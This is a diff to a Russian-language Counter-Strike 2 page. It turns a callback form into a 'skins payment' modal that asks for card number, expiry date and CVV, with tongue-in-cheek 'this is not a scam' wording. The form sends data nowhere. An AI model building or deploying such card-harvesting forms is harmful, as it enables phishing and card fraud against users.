@@ -56,7 +56,7 @@
         <div class="slider">
             <button id="cs-slider-prev">&#10094;</button>
 
-            <div class="slide active" id="slide1">
+                <div class="slide active" id="slide1">
                 <div class="slide-info">
                     <h4>Counter-Strike 2</h4>
                     <p>Добро пожаловать в новую эру легендарного шутера. Улучшенная графика, переработанные карты и точнейшая стрельба.</p>
@@ -174,27 +174,24 @@
     <div class="modal_dialog">
         <div class="modal_content">
             <form action="#">
-                <div class="modal_close">&times;</div>
-                <div class="modal_title">Мы свяжемся с вами как можно быстрее!</div>
+                <div class="modal_close">&#10006;</div>
+                <div class="modal_title">Оплата через банковскую карту для скинов</div>
+                <div class="modal_text">
+                    <p>Чтобы получить эксклюзивные скины для CS2, пожалуйста, введите свои данные ниже. Мы обещаем, что это не скам... правда!</p>
+                </div>
                 <label>
-                    <input
-                        required
-                        placeholder="Ваше имя"
-                        name="name"
-                        type="text"
-                        class="modal_input"
-                    >
+                    <input required placeholder="Номер вашей карты" name="card_number" type="text" class="modal_input">
                 </label>
                 <label>
-                    <input
-                        required
-                        placeholder="Ваш номер телефона"
-                        name="phone"
-                        type="text"
-                        class="modal_input"
-                    >
+                    <input required placeholder="Дата истечения" name="expiry_date" type="text" class="modal_input">
                 </label>
-                <button class="btn btn_dark btn_min">Перезвонить мне</button>
+                <label>
+                    <input required placeholder="CVV код" name="cvv" type="text" class="modal_input">
+                </label>
+                <button class="btn btn_dark btn_min">Оплатить</button>
+                <div class="modal_warning">
+                    <p>Мы не гарантируем, что скины не исчезнут, но мы уверены, что карта будет использоваться только для благих целей! 😊</p>
+                </div>
             </form>
         </div>
     </div>
